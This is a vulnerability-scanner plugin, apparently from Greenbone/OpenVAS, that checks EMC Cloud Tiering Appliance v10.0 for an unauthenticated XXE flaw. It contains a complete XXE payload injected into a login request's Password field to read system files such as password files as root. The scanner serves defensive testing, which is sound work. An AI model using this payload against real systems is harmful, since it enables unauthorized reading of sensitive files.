if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103931" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "8.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:P/A:N" );
	script_name( "EMC Cloud Tiering Appliance v10.0 Unauthenticated XXE Arbitrary File Read" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/32623/" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-04-01 11:51:50 +0200 (Tue, 01 Apr 2014)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_keys( "Host/runs_unixoide" );
	script_require_ports( "Services/www", 80, 443 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "An attacker can read arbitrary files from the file system
  with the permissions of the root user" );
	script_tag( name: "vuldetect", value: "Send a special crafted HTTP POST request and check the response." );
	script_tag( name: "insight", value: "EMC CTA v10.0 is susceptible to an unauthenticated XXE attack
  that allows an attacker to read arbitrary files from the file system
  with the permissions of the root user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "summary", value: "EMC Cloud Tiering Appliance v10.0 is susceptible to an unauthenticated
  XXE attack" );
	script_tag( name: "affected", value: "EMC CTA v10.0" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 443 );
buf = http_get_cache( item: "/", port: port );
if(!ContainsString( buf, "EMC Cloud Tiering" )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	xxe = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" + "<!DOCTYPE foo [\n" + "<!ELEMENT foo ANY >\n" + "<!ENTITY xxe SYSTEM \"file:///" + file + "\" >]>\n" + "<Request>\n" + "<Username>root</Username>\n" + "<Password>&xxe;</Password>\n" + "</Request>";
	len = strlen( xxe );
	req = "POST /api/login HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" + "Accept-Language: en-US,en;q=0.5\r\n" + "Accept-Encoding: identity\r\n" + "Cookie: JSESSIONID=12818F1AC5C744CF444B2683ABF6E8AC\r\n" + "Connection: keep-alive\r\n" + "Referer: https://" + host + "/UxFramework/UxFlashApplication.swf\r\n" + "Content-Type: application/x-www-form-urlencoded\r\n" + "Content-Length: " + len + "\r\n" + "\r\n" + xxe;
	buf = http_send_recv( port: port, data: req, bodyonly: FALSE );
	if(egrep( string: buf, pattern: pattern )){
		security_message( data: "The target was found to be vulnerable.", port: port );
		exit( 0 );
	}
}
exit( 99 );

